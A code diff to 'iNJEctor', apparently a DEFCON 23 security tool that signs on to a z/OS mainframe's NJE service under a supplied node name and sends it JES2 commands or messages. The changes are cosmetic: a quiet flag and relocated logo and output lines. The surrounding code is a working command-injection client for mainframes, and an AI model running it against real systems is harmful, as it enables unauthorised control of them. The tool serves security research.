@@ -39,9 +39,6 @@ import njelib
 import argparse
 import sys
 import signal
-#reload(sys)
-#sys.setdefaultencoding('utf8')
-
 
 class c:
     BLUE = '\033[94m'
@@ -70,15 +67,6 @@ def signal_handler(signal, frame):
         sys.exit(0)
 signal.signal(signal.SIGINT, signal_handler)
 
-print c.GREEN+'''    _ '''+c.RED+'''  _   __      __  ______'''+c.GREEN+'''      __
-   (_)'''+c.RED+''' / | / /     / / / ____/'''+c.GREEN+''' ____/ / ____  _____
-  / / '''+c.RED+'''/  |/ / _   / / / __/  '''+c.GREEN+'''/ ___/ __/ __ \/ ___/
- / / '''+c.RED+'''/ /|  / / /_/ / / /___ '''+c.GREEN+'''/ /__/ /_/ /_/ / /
-/_/ '''+c.RED+'''/_/ |_/  \____/ /_____/ '''+c.GREEN+'''\___/\__/\____/_/
-     The JES2 NJE Command Injector
-     ''' + c.RED + "     DEFCON 23 Edition\n"+ c.ENDC
-
-
 #start argument parser
 parser = argparse.ArgumentParser(description='iNJEctor takes a target host, target NJE hostname and your own NJE hostname and send JES2 commands to the target. Displays the output to stdout.\n See: http://www-01.ibm.com/support/knowledgecenter/SSLTBW_2.1.0/com.ibm.zos.v2r1.hasa200/has2cmdr.htm for a list of commands.')
 parser.add_argument('target',help='The z/OS Mainframe NJE Server IP or Hostname')
@@ -90,11 +78,21 @@ parser.add_argument('-m','--message',help='Send as message instead of command.',
 parser.add_argument('--pass', help='Use this flag to provide a password for sigon', dest='password', default='')
 parser.add_argument('-u','--user', help='User to send message to (instead of default console)', dest='user', default='')
 parser.add_argument('-d','--debug',help='Show debug information. Displays A LOT of information',default=False,dest='debug',action='store_true')
+parser.add_argument('-q','--quiet',help='Do not display the logo',default=False,dest='quiet',action='store_true')
 args = parser.parse_args()
+
+if not args.quiet:
+    print c.GREEN+'''        _ '''+c.RED+'''  _   __      __  ______'''+c.GREEN+'''      __
+       (_)'''+c.RED+''' / | / /     / / / ____/'''+c.GREEN+''' ____/ / ____  _____
+      / / '''+c.RED+'''/  |/ / _   / / / __/  '''+c.GREEN+'''/ ___/ __/ __ \/ ___/
+     / / '''+c.RED+'''/ /|  / / /_/ / / /___ '''+c.GREEN+'''/ /__/ /_/ /_/ / /
+    /_/ '''+c.RED+'''/_/ |_/  \____/ /_____/ '''+c.GREEN+'''\___/\__/\____/_/
+         The JES2 NJE Command Injector\n ''' + c.ENDC
+
 
 nje = njelib.NJE(args.ohost,args.rhost)
 
-print '[+] Signing on to', args.target,":", args.port
+if not args.quiet: print '[+] Signing on to', args.target,":", args.port
 
 if args.debug:
 	nje.set_debuglevel(1)
@@ -102,23 +100,22 @@ if args.debug:
 t = nje.session(host=args.target,port=args.port, timeout=2, password=args.password)
 
 if t:
-	print '[+] Signon to', nje.host ,'Complete'
+	if not args.quiet: print '[+] Signon to', nje.host ,'Complete'
 else:
 	print '[!] Signon to', nje.host ,'Failed!\n    Enable debugging to see why.'
 	sys.exit(-1)
 
 if not args.msg:
-    if not args.debug: print "[+] Sending Command:", args.command
+    if not args.debug and not args.quiet: print "[+] Sending Command:", args.command
     nmr = nje.sendCommand(args.command)
-    print nmr
+    if not args.quiet: print "[+] Reply Received:"
+    print "\n", nmr
 else:
-    if not args.debug:
-
+    if not args.debug and not args.quiet:
         if args.user:
             print "[+] Sending Message (",args.command,") to user: ", args.user
         else:
             print "[+] Sending Message:", args.command
-
     if len(args.user) > 0:
         nje.sendMessage(args.command, args.user)
     else:
